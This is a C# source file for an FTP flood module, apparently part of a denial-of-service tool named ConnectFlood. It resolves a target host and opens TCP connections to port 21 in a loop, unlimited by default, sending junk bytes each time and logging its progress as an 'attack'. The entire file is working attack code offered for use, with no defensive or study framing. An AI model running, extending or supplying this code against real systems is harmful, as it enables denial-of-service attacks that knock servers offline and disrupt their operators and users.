using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ConnectFlood
{
    public class FtpFlood : IAttack
    {
        public void StartFlood(string target, int packetCount, int speed, string none)
        {
            string host = target;
            if (Uri.IsWellFormedUriString(target, UriKind.Absolute))
            {
                Uri uri = new Uri(target);
                host = uri.Host;
            }
            IPAddress ipAddr;
            if (!IPAddress.TryParse(host, out ipAddr))
            {
                try
                {
                    ipAddr = Dns.GetHostEntry(host).AddressList[0];
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error occurred while resolving host: {ex.Message}");
                    return;
                }
            }
            Console.WriteLine($"[FTP] Attacking {host} | Packets: {(packetCount == -1 ? "∞" : packetCount.ToString())} | Speed: {speed}ms | Port: 21");

            int sentPackets = 0;
            IPEndPoint ftpServer = new IPEndPoint(ipAddr, 21);

            while (packetCount == -1 || sentPackets < packetCount)
            {
                try
                {
                    using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                    {
                        socket.Connect(ftpServer);

                        byte[] ftpRequest = GenerateFtpRequest();
                        socket.Send(ftpRequest);

                        Console.WriteLine($"[FTP] Packet {sentPackets + 1} sent to {host}:21");
                    }

                    sentPackets++;
                    Thread.Sleep(speed);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[FTP] Error: {ex.Message}");
                }
            }
            Console.WriteLine("[FTP] Attack finished.");
        }

        private byte[] GenerateFtpRequest()
        {
            return new byte[]
            {
                0x00, 0x00, 0x00, 0x00,
            };
        }
    }
}
